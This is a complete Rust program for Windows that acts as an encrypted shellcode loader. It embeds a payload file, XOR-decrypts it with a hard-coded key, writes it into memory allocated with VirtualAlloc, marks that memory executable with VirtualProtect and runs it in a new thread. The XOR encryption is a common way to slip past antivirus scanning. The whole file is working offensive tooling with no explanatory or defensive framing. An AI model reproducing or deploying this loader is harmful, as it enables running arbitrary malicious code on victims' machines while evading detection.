use std::mem::transmute;
use std::ptr::{copy_nonoverlapping, null, null_mut};
use windows_sys::Win32::Foundation::WAIT_FAILED;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

fn decrypt_data(data: &[u8], key: &str) -> Vec<u8> {
    let mut decrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key.as_bytes()[i % key.len()];
        decrypted_data.push(byte ^ key_byte);
    }

    decrypted_data
}

fn main() {
    let key = "ABCDEFGHIKLMNOPQRSTVXYZ";

    let encrypted = include_bytes!("../shellcode_enc");
    let decrypted = decrypt_data(encrypted, key);

    unsafe {
        let buffer = VirtualAlloc(
            null(),
            decrypted.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        copy_nonoverlapping(decrypted.as_ptr(), buffer.cast(), decrypted.len());
        let mut oldprotect = PAGE_READWRITE;
        VirtualProtect(buffer, decrypted.len(), PAGE_EXECUTE, &mut oldprotect);
        let buffer = transmute(buffer);
        let thread = CreateThread(null(), 0, buffer, null(), 0, null_mut());
        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
